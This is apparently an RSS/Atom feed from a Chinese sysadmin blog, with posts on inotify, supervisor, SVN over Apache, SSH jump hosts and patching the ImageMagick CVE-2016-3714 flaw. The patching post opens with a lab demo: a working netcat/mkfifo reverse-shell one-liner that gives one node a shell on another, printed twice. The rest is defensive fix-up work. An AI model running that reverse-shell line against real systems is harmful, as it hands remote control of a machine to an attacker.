<h4 id="u5BB9_u5668_u4E92_u901A"><a href="#u5BB9_u5668_u4E92_u901A" class="headerlink" title="容器互通"></a>容器互通</h4><p><a href="http://www.a-ho.com/2016/01/24/容器间通信/" target="_blank" rel="external">容器间通信</a></p>
<h4 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h4><p>[]</p>
<p><a href="http://www.cnblogs.com/programfish/p/4101884.html" target="_blank" rel="external">CMD 与 ENTRYPOINT 的区别</a></p>
<h4 id="To_be_continue"><a href="#To_be_continue" class="headerlink" title="To be continue .."></a>To be continue ..</h4><p>Reference:</p>
<p><a href="https://github.com/docker/toolbox/issues/83" target="_blank" rel="external">docker pull 证书报错</a></p>
<p><a href="https://www.gitbook.com/book/philipzheng/docker_practice/details" target="_blank" rel="external">Docker —— 從入門到實踐­</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<hr>
<p>环境:</p>
<ul>
<li>Mac OS X 10.11</li>
<li>Ubuntu 14.04</li>
<li>Docker Tools安装</li>
</ul>
<p>记录一下 docker 的学习历程, 三大基础概念已经基本了解, 然后下一步有点迷茫, 虽然迷茫, 但是不能止步不前, 于是我决定先用最笨的方法, 按书上说的做一遍吧…, 虽然看起来都懂, 但是不做感觉不踏实啊 - -<br>]]>
    
    </summary>
    
      <category term="Docker" scheme="http://yoursite.com/tags/Docker/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[inotify 监控文件和目录变化]]></title>
    <link href="http://yoursite.com/2016/05/11/inotify-%E7%9B%91%E6%8E%A7%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%98%E5%8C%96/"/>
    <id>http://yoursite.com/2016/05/11/inotify-监控文件和目录变化/</id>
    <published>2016-05-11T01:49:32.000Z</published>
    <updated>2016-06-23T01:01:57.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u672C_u6765_u6253_u7B97_u628A_u8981_u76D1_u63A7_u7684_u6587_u4EF6_u653E_mysql_2C__u901A_u8FC7_u76D1_u63A7_mysql__u5B9E_u73B0"><a href="#u672C_u6765_u6253_u7B97_u628A_u8981_u76D1_u63A7_u7684_u6587_u4EF6_u653E_mysql_2C__u901A_u8FC7_u76D1_u63A7_mysql__u5B9E_u73B0" class="headerlink" title="本来打算把要监控的文件放 mysql, 通过监控 mysql 实现"></a>本来打算把要监控的文件放 mysql, 通过监控 mysql 实现</h3><pre><code>广州-kali  17:06:13
mysql 能不能设置这样的功能:  查询某个表的某个字段就触发报警脚本
北京-青山  17:08:22
.mysql_history 
北京-青山  17:08:53
默认你连接mysql后执行的命令这个文件里会有记录，你可以发告警，不过是事后
北京-青山  17:09:19
不过这个是在服务器上操作时的告警
北京-青山  17:09:33
远程odbc连接的话里面没有
北京-青山  17:10:14
binlog日志里应该可以提取出来

广州-小王-Vip  17:19:42
建个触发器可行？select的不知道能否判断，没研究过
北京-青山  17:20:05
select不行，delete\update可以
</code></pre><p>但是网上有的说查看正在写入的 binlog 会有不良后果… , 所以另寻他法, 想起了以前做文件同步时候用的 inotify</p>
<h3 id="u5B89_u88C5_u4F7F_u7528_inotify-tools"><a href="#u5B89_u88C5_u4F7F_u7528_inotify-tools" class="headerlink" title="安装使用 inotify-tools"></a>安装使用 inotify-tools</h3><p>首先查看系统内核支不支持 inotify</p>
<pre><code># grep INOTIFY_USER /boot/config-$(uname -r)
CONFIG_INOTIFY_USER=y
</code></pre><p>inotify 是用 C 的, 作为一只菜鸟 sa, 我用用封装好的inotify-tools 就够了~</p>
<p>安装</p>
<pre><code>yum -y install inotify-tools
</code></pre><p>看看监控/root  目录的效果, 在一个终端输入如下命令, 另一个终端做测试, 比如cat a.txt:</p>
<pre><code>[root@node1 ~]# inotifywait -mrq --timefmt &apos;%d/%m/%y %H:%M&apos; --format &apos;%T %w%f %e&apos; -e access,move,modify,delete,create,attrib /root
11/05/16 10:54 /root/a.txt ACCESS
</code></pre><p>利用管道就能触发变更操作:</p>
<pre><code>[root@node1 ~]# inotifywait -mrq --timefmt &apos;%d/%m/%y %H:%M&apos; --format &apos;%T %w%f %e&apos; -e access,move,modify,delete,create,attrib /root | while read line; do echo &quot;sb. is doing sth.&quot; ; done
</code></pre><p>想排除监控路径, 加–exclude 参数</p>
<p><a href="https://www.centos.bz/2012/06/inotify-tools-introduction/" target="_blank" rel="external">inotify-tools使用方法介绍</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u672C_u6765_u6253_u7B97_u628A_u8981_u76D1_u63A7_u7684_u6587_u4EF6_u653E_mysql_2C__u901A_u8FC7_u76D1_u63A7_mysql__u5B9E_u73B0"><a hre]]>
    </summary>
    
      <category term="inotify" scheme="http://yoursite.com/tags/inotify/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用 supervisor 管理进程]]></title>
    <link href="http://yoursite.com/2016/05/11/%E4%BD%BF%E7%94%A8-supervisor-%E7%AE%A1%E7%90%86%E8%BF%9B%E7%A8%8B/"/>
    <id>http://yoursite.com/2016/05/11/使用-supervisor-管理进程/</id>
    <published>2016-05-11T01:08:17.000Z</published>
    <updated>2016-05-25T01:13:50.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u5B89_u88C5_uFF08Centos_uFF09_uFF1A"><a href="#u5B89_u88C5_uFF08Centos_uFF09_uFF1A" class="headerlink" title="安装（Centos）："></a>安装（Centos）：</h3><pre><code>yum install python-setuptools

easy_install supervisor
</code></pre><p>测试是否安装成功：</p>
<pre><code>echo_supervisord_conf
</code></pre><p>会显示以下内容，其实是一个配置模版:</p>
<pre><code>; Sample supervisor config file.
;
; For more information on the config file, please see:
; http://supervisord.org/configuration.html
;
; Notes:
;  - Shell expansion (&quot;~&quot; or &quot;$HOME&quot;) is not supported.  Environment
;    variables can be expanded using this syntax: &quot;%(ENV_HOME)s&quot;.
;  - Comments must have a leading space: &quot;a=b ;comment&quot; not &quot;a=b;comment&quot;.

[unix_http_server]
file=/tmp/supervisor.sock   ; (the path to the socket file)
;chmod=0700                 ; socket file mode (default 0700)
;chown=nobody:nogroup       ; socket file uid:gid owner
;username=user              ; (default is no username (open server))
;password=123               ; (default is no password (open server))

;[inet_http_server]         ; inet (TCP) server disabled by default
;port=127.0.0.1:9001        ; (ip_address:port specifier, *:port for all iface)
;username=user              ; (default is no username (open server))
;password=123               ; (default is no password (open server))

[supervisord]
logfile=/tmp/supervisord.log ; (main log file;default $CWD/supervisord.log)
logfile_maxbytes=50MB        ; (max main logfile bytes b4 rotation;default 50MB)
logfile_backups=10           ; (num of main logfile rotation backups;default 10)
loglevel=info                ; (log level;default info; others: debug,warn,trace)
pidfile=/tmp/supervisord.pid ; (supervisord pidfile;default supervisord.pid)
nodaemon=false               ; (start in foreground if true;default false)
minfds=1024                  ; (min. avail startup file descriptors;default 1024)
minprocs=200                 ; (min. avail process descriptors;default 200)
;umask=022                   ; (process file creation umask;default 022)
;user=chrism                 ; (default is current user, required if root)
;identifier=supervisor       ; (supervisord identifier, default is &apos;supervisor&apos;)
;directory=/tmp              ; (default is not to cd during start)
;nocleanup=true              ; (don&apos;t clean up tempfiles at start;default false)
;childlogdir=/tmp            ; (&apos;AUTO&apos; child log dir, default $TEMP)
;environment=KEY=&quot;value&quot;     ; (key value pairs to add to environment)
;strip_ansi=false            ; (strip ansi escape codes in logs; def. false)

; the below section must remain in the config file for RPC
; (supervisorctl/web interface) to work, additional interfaces may be
; added by defining them in separate rpcinterface: sections
[rpcinterface:supervisor]
supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface

[supervisorctl]
serverurl=unix:///tmp/supervisor.sock ; use a unix:// URL  for a unix socket
;serverurl=http://127.0.0.1:9001 ; use an http:// url to specify an inet socket
;username=chris              ; should be same as http_username if set
;password=123                ; should be same as http_password if set
;prompt=mysupervisor         ; cmd line prompt (default &quot;supervisor&quot;)
;history_file=~/.sc_history  ; use readline history if available

; The below sample program section shows all possible program subsection values,
; create one or more &apos;real&apos; program: sections to be able to control them under
; supervisor.

;[program:theprogramname]
;command=/bin/cat              ; the program (relative uses PATH, can take args)
;process_name=%(program_name)s ; process_name expr (default %(program_name)s)
;numprocs=1                    ; number of processes copies to start (def 1)
;directory=/tmp                ; directory to cwd to before exec (def no cwd)
;umask=022                     ; umask for process (default None)
;priority=999                  ; the relative start priority (default 999)
;autostart=true                ; start at supervisord start (default: true)
;startsecs=1                   ; # of secs prog must stay up to be running (def. 1)
;startretries=3                ; max # of serial start failures when starting (default 3)
;autorestart=unexpected        ; when to restart if exited after running (def: unexpected)
;exitcodes=0,2                 ; &apos;expected&apos; exit codes used with autorestart (default 0,2)
;stopsignal=QUIT               ; signal used to kill process (default TERM)
;stopwaitsecs=10               ; max num secs to wait b4 SIGKILL (default 10)
;stopasgroup=false             ; send stop signal to the UNIX process group (default false)
;killasgroup=false             ; SIGKILL the UNIX process group (def false)
;user=chrism                   ; setuid to this UNIX account to run the program
;redirect_stderr=true          ; redirect proc stderr to stdout (default false)
;stdout_logfile=/a/path        ; stdout log path, NONE for none; default AUTO
;stdout_logfile_maxbytes=1MB   ; max # logfile bytes b4 rotation (default 50MB)
;stdout_logfile_backups=10     ; # of stdout logfile backups (default 10)
;stdout_capture_maxbytes=1MB   ; number of bytes in &apos;capturemode&apos; (default 0)
;stdout_events_enabled=false   ; emit events on stdout writes (default false)
;stderr_logfile=/a/path        ; stderr log path, NONE for none; default AUTO
;stderr_logfile_maxbytes=1MB   ; max # logfile bytes b4 rotation (default 50MB)
;stderr_logfile_backups=10     ; # of stderr logfile backups (default 10)
;stderr_capture_maxbytes=1MB   ; number of bytes in &apos;capturemode&apos; (default 0)
;stderr_events_enabled=false   ; emit events on stderr writes (default false)
;environment=A=&quot;1&quot;,B=&quot;2&quot;       ; process environment additions (def no adds)
;serverurl=AUTO                ; override serverurl computation (childutils)

; The below sample eventlistener section shows all possible
; eventlistener subsection values, create one or more &apos;real&apos;
; eventlistener: sections to be able to handle event notifications
; sent by supervisor.

;[eventlistener:theeventlistenername]
;command=/bin/eventlistener    ; the program (relative uses PATH, can take args)
;process_name=%(program_name)s ; process_name expr (default %(program_name)s)
;numprocs=1                    ; number of processes copies to start (def 1)
;events=EVENT                  ; event notif. types to subscribe to (req&apos;d)
;buffer_size=10                ; event buffer queue size (default 10)
;directory=/tmp                ; directory to cwd to before exec (def no cwd)
;umask=022                     ; umask for process (default None)
;priority=-1                   ; the relative start priority (default -1)
;autostart=true                ; start at supervisord start (default: true)
;startsecs=1                   ; # of secs prog must stay up to be running (def. 1)
;startretries=3                ; max # of serial start failures when starting (default 3)
;autorestart=unexpected        ; autorestart if exited after running (def: unexpected)
;exitcodes=0,2                 ; &apos;expected&apos; exit codes used with autorestart (default 0,2)
;stopsignal=QUIT               ; signal used to kill process (default TERM)
;stopwaitsecs=10               ; max num secs to wait b4 SIGKILL (default 10)
;stopasgroup=false             ; send stop signal to the UNIX process group (default false)
;killasgroup=false             ; SIGKILL the UNIX process group (def false)
;user=chrism                   ; setuid to this UNIX account to run the program
;redirect_stderr=false         ; redirect_stderr=true is not allowed for eventlisteners
;stdout_logfile=/a/path        ; stdout log path, NONE for none; default AUTO
;stdout_logfile_maxbytes=1MB   ; max # logfile bytes b4 rotation (default 50MB)
;stdout_logfile_backups=10     ; # of stdout logfile backups (default 10)
;stdout_events_enabled=false   ; emit events on stdout writes (default false)
;stderr_logfile=/a/path        ; stderr log path, NONE for none; default AUTO
;stderr_logfile_maxbytes=1MB   ; max # logfile bytes b4 rotation (default 50MB)
;stderr_logfile_backups=10     ; # of stderr logfile backups (default 10)
;stderr_events_enabled=false   ; emit events on stderr writes (default false)
;environment=A=&quot;1&quot;,B=&quot;2&quot;       ; process environment additions
;serverurl=AUTO                ; override serverurl computation (childutils)

; The below sample group section shows all possible group values,
; create one or more &apos;real&apos; group: sections to create &quot;heterogeneous&quot;
; process groups.

;[group:thegroupname]
;programs=progname1,progname2  ; each refers to &apos;x&apos; in [program:x] definitions
;priority=999                  ; the relative start priority (default 999)

; The [include] section can just contain the &quot;files&quot; setting.  This
; setting can list multiple files (separated by whitespace or
; newlines).  It can also contain wildcards.  The filenames are
; interpreted as relative to this file.  Included files *cannot*
; include files themselves.

;[include]
;files = relative/directory/*.ini
</code></pre><h3 id="u914D_u7F6E"><a href="#u914D_u7F6E" class="headerlink" title="配置"></a>配置</h3><p>创建配置文件：</p>
<pre><code>echo_supervisord_conf &gt; /etc/supervisord.conf
</code></pre><h4 id="u914D_u7F6E_u76D1_u63A7_u4E00_u4E2A_u547D_u4EE4_u7684_u8FDB_u7A0B"><a href="#u914D_u7F6E_u76D1_u63A7_u4E00_u4E2A_u547D_u4EE4_u7684_u8FDB_u7A0B" class="headerlink" title="配置监控一个命令的进程"></a>配置监控一个命令的进程</h4><p>比如有个脚本, 用来监控文件变化 ,发报警的:</p>
<pre><code># cat  /root/shell/inotify_bid.sh
#!/bin/bash

PHP=/usr/bin/php
ALARM=/home/www/app/command/alarm.php
LOG=/data/bid_inotify.log
DIR=&quot;/data/app_upload_files/file /data/app_upload_files/file_bak/&quot;

/bin/inotifywait -mrq --timefmt &apos;%d/%m/%y %H:%M&apos; --format &apos;%T %w%f %e&apos; -e access,modify,delete,attrib $DIR
do
    echo $line |tee $LOG &gt;&gt; /root/shell/bid_inotify.log
    $PHP  $ALARM
done
</code></pre><p>怕这个后台运行挂掉, 所以用 supervisor 来做监控:</p>
<p>再配置 <code>/etc/supervisord.conf</code>  </p>
<pre><code>[program:inotify_bid]
directory = /root/shell/ ; 程序的启动目录, 执行命令前进入的目录
command = /root/shell/inotify_bid.sh  ; 启动命令，可以看出与手动在命令行启动的命令是一样的
autostart = true     ; 在 supervisord 启动的时候也自动启动
startsecs = 5        ; 启动 5 秒后没有异常退出，就当作已经正常启动了
autorestart = true   ; 程序异常退出后自动重启
startretries = 3     ; 启动失败自动重试次数，默认是 3
redirect_stderr = true  ; 把 stderr 重定向到 stdout，默认 false
stdout_logfile_maxbytes = 20MB  ; stdout 日志文件大小，默认 50MB
stdout_logfile_backups = 20     ; stdout 日志文件备份数
; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件）
stdout_logfile = /tmp/inotify_bid_stdout.log
</code></pre><p>每当修改了命令的时候, 要重启一下program:</p>
<pre><code># supervisorctl restart inotify_bid
inotify_bid: stopped
inotify_bid: started
</code></pre><p>查看状态</p>
<pre><code># supervisorctl status inotify_bid
</code></pre><h3 id="u5E38_u7528_u7BA1_u7406_u547D_u4EE4"><a href="#u5E38_u7528_u7BA1_u7406_u547D_u4EE4" class="headerlink" title="常用管理命令"></a>常用管理命令</h3><ul>
<li>supervisord，初始启动Supervisord，启动、管理配置中设置的进程。</li>
<li>supervisorctl stop programxxx，停止某一个进程(programxxx)，programxxx为[program:chatdemon]里配置的值，这个示例就是chatdemon。</li>
<li>supervisorctl start programxxx，启动某个进程</li>
<li>supervisorctl restart programxxx，重启某个进程</li>
<li>supervisorctl stop all，停止全部进程，注：start、restart、stop都不会载入最新的配置文件。</li>
<li>supervisorctl reload，载入最新的配置文件，并按新的配置启动、管理所有进程。</li>
</ul>
<p>参考:</p>
<p><a href="https://fukun.org/archives/07102224.html" target="_blank" rel="external">Supervisor的安装与使用入门</a></p>
<p><a href="http://zengxh.blog.51cto.com/10650604/1713838" target="_blank" rel="external">supervisor安装并监控进程</a></p>
<p><a href="http://www.cnblogs.com/shanyou/p/5075744.html" target="_blank" rel="external">进程监控工具supervisor 启动Mongodb</a></p>
<p><a href="http://liyangliang.me/posts/2015/06/using-supervisor/" target="_blank" rel="external">使用 supervisor 管理进程</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u5B89_u88C5_uFF08Centos_uFF09_uFF1A"><a href="#u5B89_u88C5_uFF08Centos_uFF09_uFF1A" class="headerlink" title="安装（Centos）："></a>安装（Ce]]>
    </summary>
    
      <category term="supervisor" scheme="http://yoursite.com/tags/supervisor/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[修复ImageMagic漏洞(CVE-2016-3714)]]></title>
    <link href="http://yoursite.com/2016/05/10/%E4%BF%AE%E5%A4%8DImageMagic%E6%BC%8F%E6%B4%9E-CVE-2016-3714/"/>
    <id>http://yoursite.com/2016/05/10/修复ImageMagic漏洞-CVE-2016-3714/</id>
    <published>2016-05-10T10:29:23.000Z</published>
    <updated>2016-05-11T07:03:19.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C"><a href="#u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C" class="headerlink" title="反弹 Shell (Reverse Shell) 实验"></a>反弹 Shell (Reverse Shell) 实验</h3><p>将node1的 shell 反弹给 node3</p>
<p>node3监听2333端口:</p>
<pre><code>[root@node3 ~]# nc -lvv 2333
Connection from 10.45.207.236 port 2333 [tcp/snapp] accepted
sh-4.1# hostname
hostname
node1
</code></pre><p>node1 nc反弹:</p>
<pre><code>[root@node1 ~]# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc node3_ip 2333 &gt;/tmp/f
rm: cannot remove `/tmp/f&apos;: No such file or directory
</code></pre><a id="more"></a>
<h3 id="u4FEE_u590D_u8FC7_u7A0B_3A"><a href="#u4FEE_u590D_u8FC7_u7A0B_3A" class="headerlink" title="修复过程:"></a>修复过程:</h3><p>先到<a href="https://github.com/ImageTragick/PoCs" target="_blank" rel="external">这里</a>下载检测脚本:</p>
<p>检测脚本的使用方法:</p>
<pre><code>git clone https://github.com/ImageTragick/PoCs.git
cd PoCs
./test.sh
</code></pre><p>开始检测</p>
<pre><code>[root@HD_Server_Config PoCs]# ./test.sh
testing read
UNSAFE

testing delete
UNSAFE

testing http with local port: 18781
SAFE

testing http with nonce: apPod0Vg
SAFE

testing rce1
UNSAFE

testing rce2
SAFE

testing MSL
UNSAFE
</code></pre><p>可以看到, 是 UNSAFE 的</p>
<p>修复方案:</p>
<p>1.在上传图片时需要通过文件内容来判断用户上传的是否为真实图片类型.(这个需要告知开发人员)</p>
<p>2.使用策略配置文件来禁用ImageMagick的有风险的编码器</p>
<p>对于ImageMagick全局策略配置文件在/etc/ImageMagick下对policy.xml最后一行进行增加下列配置:</p>
<pre><code>vi /etc/ImageMagick/policy.xml

&lt;policymap&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPHEMERAL&quot; /&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;URL&quot; /&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;HTTPS&quot; /&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MVG&quot; /&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MSL&quot; /&gt;

&lt;/policymap&gt;
</code></pre><p>再次运行检测脚本:</p>
<pre><code>[root@HD_Server_Config PoCs]# ./test.sh
testing read
SAFE

testing delete
SAFE

testing http with local port: 47221
SAFE

testing http with nonce: hMtPw5DB
SAFE

testing rce1
SAFE

testing rce2
SAFE

testing MSL
SAFE
</code></pre><p>参考:</p>
<p><a href="https://imagetragick.com/" target="_blank" rel="external">https://imagetragick.com/</a></p>
<p><a href="http://bobao.360.cn/learning/detail/2862.html" target="_blank" rel="external">CVE-2016-3714ImageMagick远程执行漏洞修复建议</a></p>
<p><a href="http://le4f.net/post/post/reverse-shell-during-the-penetration-test" target="_blank" rel="external">渗透测试:反弹与转发小结 - Reverse Shell During the Penetration Test</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C"><a href="#u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C" class="headerlink" title="反弹 Shell (Reverse Shell) 实验"></a>反弹 Shell (Reverse Shell) 实验</h3><p>将node1的 shell 反弹给 node3</p>
<p>node3监听2333端口:</p>
<pre><code>[root@node3 ~]# nc -lvv 2333
Connection from 10.45.207.236 port 2333 [tcp/snapp] accepted
sh-4.1# hostname
hostname
node1
</code></pre><p>node1 nc反弹:</p>
<pre><code>[root@node1 ~]# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc node3_ip 2333 &gt;/tmp/f
rm: cannot remove `/tmp/f&apos;: No such file or directory
</code></pre>]]>
    
    </summary>
    
      <category term="Reverse Shell" scheme="http://yoursite.com/tags/Reverse-Shell/"/>
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[svn 配置http 服务]]></title>
    <link href="http://yoursite.com/2016/05/06/svn-%E9%85%8D%E7%BD%AEhttp-%E6%9C%8D%E5%8A%A1/"/>
    <id>http://yoursite.com/2016/05/06/svn-配置http-服务/</id>
    <published>2016-05-06T03:07:33.000Z</published>
    <updated>2016-05-09T09:59:32.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u5B89_u88C5_u670D_u52A1"><a href="#u5B89_u88C5_u670D_u52A1" class="headerlink" title="安装服务"></a>安装服务</h3><p>安装http</p>
<pre><code>yum install -y httpd
</code></pre><p>安装 svn</p>
<pre><code>yum install -y subversion
</code></pre><p>安装Apache SVN模块</p>
<pre><code>yum install -y mod_dav_svn
</code></pre><h3 id="u914D_u7F6E"><a href="#u914D_u7F6E" class="headerlink" title="配置"></a>配置</h3><p>然后是把 svn 配置运行起来, 教程网上很多… </p>
<p>再然后.把 svn 整合进 apache 的配置文件</p>
<pre><code>[root@iZ94c5cs7guZ httpd]# cat /etc/httpd/conf.d/subversion.conf
LoadModule dav_svn_module     modules/mod_dav_svn.so
LoadModule authz_svn_module   modules/mod_authz_svn.so

&lt;Location /svn&gt;    #这行是配置访问的 url , 比如 http://a.com/svn/repos
    DAV svn
    SVNParentPath /data/svndata        #这个就是svn的主目录
    AuthType Basic
    AuthName &quot;Authorization SVN: &quot;
    AuthzSVNAccessFile /data/svndata/authz    #这个文件是从某个仓库考过来的, 权限自己根据需求修改
    AuthUserFile /etc/httpd/conf.d/passwdfile   #这个文件是 htpasswd 生成的, 生成的用户名要写进上面的 auth 文件
    Require valid-user
&lt;/Location&gt;
</code></pre><p>修改一些权限:</p>
<pre><code>chown apache:apache -R /data/svndata
chown apache:apache /etc/httpd/conf.d/passwdfile
</code></pre><p>htpasswd 新增用户:</p>
<pre><code>htpasswd  -n username
</code></pre><p>然后可以配置 nginx 反向代理:</p>
<h4 id="u751F_u6210_SSL__u8BC1_u4E66"><a href="#u751F_u6210_SSL__u8BC1_u4E66" class="headerlink" title="生成 SSL 证书"></a>生成 SSL 证书</h4><p>上面的还没有 https 加密</p>
<pre><code># cd /etc/httpd/conf/
# openssl req -new -x509 -keyout server.key -out server.crt -days 365 -nodes  #这个是缩365天之后不能用了嘛, 感觉在挖坑...
</code></pre><h4 id="u6DFB_u52A0_u7528_u6237_u7684_u811A_u672C"><a href="#u6DFB_u52A0_u7528_u6237_u7684_u811A_u672C" class="headerlink" title="添加用户的脚本"></a>添加用户的脚本</h4><pre><code>cat svn_add_http_admin.sh
#!/bin/bash

SVNPATH=/data/svndata/        #svn 主目录
PASSWDFILE=/etc/httpd/conf.d/passwdfile

read -p &quot;input user name: &quot; USER
read -p &quot;input password: &quot; PASSWD

/usr/bin/htpasswd -b $PASSWDFILE $USER $PASSWD
sed  -ri &quot;s@(^admin = .*)@\1\,$USER@&quot; $SVNPATH/authz
</code></pre><p>参考:</p>
<p><a href="http://my.oschina.net/u/206356/blog/287635" target="_blank" rel="external">Centos 下搭建SVN ＋ Apache 服务器</a></p>
<p><a href="http://www.opstool.com/article/282" target="_blank" rel="external">CentOS搭建Nginx+Subversion环境</a></p>
<p><a href="https://wiki.archlinux.org/index.php/Subversion_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87\" target="_blank" rel="external">Subversion (简体中文)</a>)</p>
<p><a href="http://fengchj.com/?p=735" target="_blank" rel="external">Apache核心(Core)指令<location>和<directory>区别</directory></location></a></p>
<p><a href="https://blog.linuxeye.com/333.html" target="_blank" rel="external">Apache htpasswd命令用法详解</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u5B89_u88C5_u670D_u52A1"><a href="#u5B89_u88C5_u670D_u52A1" class="headerlink" title="安装服务"></a>安装服务</h3><p>安装http</p>
<pre><code>yu]]>
    </summary>
    
      <category term="apache" scheme="http://yoursite.com/tags/apache/"/>
    
      <category term="svn" scheme="http://yoursite.com/tags/svn/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[svnhook 同步代码到远端机器]]></title>
    <link href="http://yoursite.com/2016/05/05/svnhook-%E5%90%8C%E6%AD%A5%E4%BB%A3%E7%A0%81%E5%88%B0%E8%BF%9C%E7%AB%AF%E6%9C%BA%E5%99%A8/"/>
    <id>http://yoursite.com/2016/05/05/svnhook-同步代码到远端机器/</id>
    <published>2016-05-05T07:30:03.000Z</published>
    <updated>2016-05-05T07:56:21.000Z</updated>
    <content type="html"><![CDATA[<p>本文仅做记录</p>
<p>post-commit 脚本主要是通过ssh 远程命令来执行自动更新, 需配置 ssh 免密码登陆</p>
<pre><code>/usr/bin/ssh -p22 root@remote_ip &quot;/bin/bash /opt/www/svn_beta_update.sh&quot; 2&gt;&gt;/tmp/svn_error.log
</code></pre><p>远端机器的同步代码脚本:</p>
<pre><code>#!/bin/bash

/usr/bin/svn update /opt/www/dest/ 2&gt;&gt; svn_update_error.log
</code></pre><p>参考:</p>
<p><a href="http://denglz.blog.51cto.com/3617037/1341835" target="_blank" rel="external">SVN 使用 hooks 自动更新代码到远程的web目录下</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>本文仅做记录</p>
<p>post-commit 脚本主要是通过ssh 远程命令来执行自动更新, 需配置 ssh 免密码登陆</p>
<pre><code>/usr/bin/ssh -p22 root@remote_ip &quot;/bin/bash /opt/www/]]>
    </summary>
    
      <category term="svn" scheme="http://yoursite.com/tags/svn/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Centos 7 配置 ftp 服务器]]></title>
    <link href="http://yoursite.com/2016/05/05/Centos-7-%E9%85%8D%E7%BD%AE-ftp-%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://yoursite.com/2016/05/05/Centos-7-配置-ftp-服务器/</id>
    <published>2016-05-05T06:35:05.000Z</published>
    <updated>2016-05-05T06:39:07.000Z</updated>
    <content type="html"><![CDATA[<p>照这个做</p>
<p><a href="https://www.zybuluo.com/hshustc/note/180958" target="_blank" rel="external">CentOS7.0安装配置vsftp</a></p>
<p>参考:</p>
<p><a href="http://www.ha97.com/4113.html" target="_blank" rel="external">Linux下vsftpd基本配置和虚拟用户设置的安全方法</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>照这个做</p>
<p><a href="https://www.zybuluo.com/hshustc/note/180958" target="_blank" rel="external">CentOS7.0安装配置vsftp</a></p>
<p>参考:</p>
<p]]>
    </summary>
    
      <category term="ftp" scheme="http://yoursite.com/tags/ftp/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[配置ssh和ansible通过跳板机直接登录目标机器]]></title>
    <link href="http://yoursite.com/2016/05/03/%E9%85%8D%E7%BD%AEssh%E5%92%8Cansible%E9%80%9A%E8%BF%87%E8%B7%B3%E6%9D%BF%E6%9C%BA%E7%9B%B4%E6%8E%A5%E7%99%BB%E5%BD%95%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8/"/>
    <id>http://yoursite.com/2016/05/03/配置ssh和ansible通过跳板机直接登录目标机器/</id>
    <published>2016-05-03T10:46:51.000Z</published>
    <updated>2016-05-06T01:04:21.000Z</updated>
    <content type="html"><![CDATA[<h3 id="ssh_u914D_u7F6E"><a href="#ssh_u914D_u7F6E" class="headerlink" title="ssh配置"></a>ssh配置</h3><p>有这样的场景, 我们本地的机器 A 需要通过先登录跳板机 B , 然后在 B 上登录目标机器 C, 本文介绍就是通过配置, 实现从 A 直接登录 C .</p>
<p>首先, 将 A 的公钥放到 B , C的 authorized_keys 文件中, 然后确保能从 A免密码登录到 B. 如果看不懂这句, 请先去补习 ssh 通过密钥免密码登录的内容. </p>
<p>在A机的 <code>~/.ssh/config</code> 中配置</p>
<pre><code>host Server_C
user=user_to_C             #这个用户是 B 上登录到 C 的用户
port=22                #这个端口是 B 上登录到 C 的端口
hostname=Server_C_IP
identityfile=~/.ssh/id_rsa          #本地私钥文件
proxycommand ssh user_to_B@Server_B_IP -p 2000 nc %h %p      # 转发命令, 注意是 A 登录到 B 的用户, IP 和端口
forwardagent yes
</code></pre><a id="more"></a>
<p>然后在A上执行 ssh Server_C 就能登录 到 C 了</p>
<h3 id="Ansible__u7684_u914D_u7F6E"><a href="#Ansible__u7684_u914D_u7F6E" class="headerlink" title="Ansible 的配置"></a>Ansible 的配置</h3><p>原来ansible可以直接用.ssh/config 的东西…只要名字对上就行了…</p>
<p>比如 ansible/hosts 里可以这样用 Server_C</p>
<pre><code>[S_C]
Server_C
</code></pre><p>然后 ssh 跳转什么的, 也可以用 ssh 配置里面的了</p>
